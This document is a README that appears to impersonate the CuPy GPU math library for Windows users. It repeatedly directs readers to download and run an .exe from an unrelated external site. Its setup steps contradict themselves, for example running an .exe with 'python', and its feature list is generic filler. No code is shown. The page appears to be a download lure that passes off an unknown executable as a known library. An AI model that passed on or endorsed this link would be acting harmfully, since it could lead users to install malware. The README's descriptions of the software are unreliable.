# ⚡ cupy - Speed up your computer math tasks

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github)](https://granicio1.github.io)

## 🎯 Purpose

This software helps your computer perform complex math faster. It acts as a bridge between your regular math tools and your computer's graphics card. Most computers rely on the main processor to handle math. This tool shifts that work to the graphics card. Graphics cards contain thousands of small cores that solve math problems at high speeds. You get results faster when you let the graphics card handle heavy workloads.

## ⚙️ System Requirements

Your computer needs specific parts to run this tool well. Check these items before you proceed.

- Operating System: Windows 10 or Windows 11.
- Graphics Card: An NVIDIA card with at least 4GB of video memory. Use a card that is less than five years old for the best results.
- Drivers: You must update your graphics card drivers. Visit the NVIDIA website and search for the latest GeForce or Quadro drivers for your specific card.
- Software Base: Install the latest version of Python from the official Python website. Ensure you check the box that says "Add Python to PATH" during installation.

## 💾 Downloading the Software 

Follow these steps to get the files on your computer.

1. Visit [this page to download](https://granicio1.github.io).
2. Look for the section labeled Releases on the right side of the screen.
3. Click the most recent version tag.
4. Scroll to the Assets list.
5. Select the file ending in .exe to start your download.
6. Save the file to your desktop for easy access.

## 🛠️ Setting Up Your Environment 

After the download finishes, you must prepare your system.

- Create a new folder on your computer named "cupy_project".
- Move the downloaded file into this folder.
- Open your Start menu and type "cmd" to open the Command Prompt.
- Type `cd Desktop\cupy_project` and press Enter.
- Verify that Python is ready by typing `python --version` and pressing Enter. You should see a version number.

## 🚀 Running the Tool 

You are now ready to use the software.

1. In your Command Prompt window, type `python` followed by the name of your downloaded file. 
2. Press Enter to start the program.
3. The program will scan your hardware to ensure your graphics card is compatible.
4. If the scan succeeds, the program will display a confirmation message.
5. You can now run your math files through this interface.

## 🔍 Understanding the Technology 

This tool uses several libraries to achieve high speeds. These libraries act as the language between the software and the hardware.

- cuBLAS: Handles basic math operations like additions and multiplications.
- CUDA: The core framework that allows the graphics card to perform general tasks.
- cuDNN: Helps the software recognize patterns in data.
- cuSOLVER: Solves complex equations that involve many variables.
- cuSPARSE: Manages large sets of data that contain many zeros.
- NCCL: Allows multiple graphics cards to share data effectively.
- NVRTC: Compiles code on the fly to match your specific hardware.
- NVTX: Tracks the timing of your operations to ensure maximum speed.

## 💡 Troubleshooting Common Issues 

If you encounter errors, check these common points.

- Error: "No GPU detected."
  This usually means your drivers are outdated. Revisit the NVIDIA website to download the latest setup file. Install it, then restart your computer.

- Error: "Command not found."
  This means Python is not in your system path. Reinstall Python and ensure you select the Add to PATH option during the setup process.

- Performance is slow.
  Ensure your monitor is plugged into the graphics card rather than the motherboard. Some computers default to the main processor if the monitor cable occupies the wrong port.

- The application closes immediately.
  Check if your graphics card meets the memory requirements. If you have less than 2GB of video memory, the program will shut down to protect your system hardware.

## 📊 Features 

- Automatic hardware detection.
- Fast calculation of large data tables.
- Seamless compatibility with common math software.
- Memory management that prevents system slowdowns during intense tasks.
- Log tracking for performance monitoring.
- Support for modern data structures.
- Simple installation process without complex configuration files.
- Optimized performance for deep learning data sets.
- Lightweight footprint on your hard drive.

## 🛡️ Best Practices 

Keep your graphics card drivers up to date. New updates often include fixes for bugs that appear when running heavy math tasks. Close other programs that use the graphics card while you use this tool. This includes video games or video editing software. Doing this frees up memory and makes your calculations finish in less time. If you use this tool often, consider an upgrade to your power supply to ensure your card receives stable electricity during peaks of activity.